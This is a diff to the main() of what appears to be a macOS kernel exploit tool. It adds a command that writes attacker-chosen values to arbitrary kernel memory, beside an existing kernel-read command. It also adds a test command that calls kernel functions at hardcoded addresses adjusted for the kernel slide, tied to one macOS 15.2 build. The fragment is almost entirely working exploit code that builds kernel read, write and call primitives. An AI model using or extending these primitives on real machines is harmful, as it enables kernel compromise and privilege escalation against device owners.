@@ -39,11 +39,29 @@ int main(int argc, char *argv[])
         kread64(sockfd, (void*)readat, &value);
         INFO("where: 0x%llx, what : 0x%016llx", readat, value);
         INFO("value : 0x%x", (uint8_t)value);
+    } else if (argc == 4 && strncmp(argv[1], "write", strlen(argv[1])) == 0) {
+        uint64_t writeat = 0;
+        uint64_t value = 0;
+        sscanf(argv[2], "0x%llx", &writeat);
+        sscanf(argv[3], "0x%llx", &value);
+        kwrite64(sockfd, writeat, value);
+        INFO("where: 0x%llx, what : 0x%016llx", writeat, value);
     } else if (argc == 2 && strncmp(argv[1], "proc", strlen(argv[1])) == 0) {
         uint64_t proc = get_current_proc(sockfd);
         INFO("proc: 0x%016llx", proc);
+    } else if (argc == 2 && strncmp(argv[1], "test_kcall", strlen(argv[1])) == 0) {
+        uint64_t proc = get_current_proc(sockfd);
+        // it's valid only for macOS 15.2 24C101 t6020
+        uint64_t kalloc_data_external = 0xFFFFFE0008785864;
+        uint64_t MALLOC_external = 0xFFFFFE0008E651EC;
+        uint64_t kmem = kcall(sockfd, 0xFFFFFE0008E651EC + kslide, 1, 0x4000);
+        INFO("kmem : 0x%016llx", kmem);
+        // uint64_t kr = kcall(sockfd, getpid_addr, 3, proc, NULL, kmem);
+        // assert(kr == 0);
+
+        // getpid(proc_t p, __unused struct getpid_args * uap, int32_t *retval)
     }
-    
+
 #if 0
     kread64(sockfd, kernel_base, &value);
     INFO("where: %p, what : 0x%016llx", kernel_base, value);
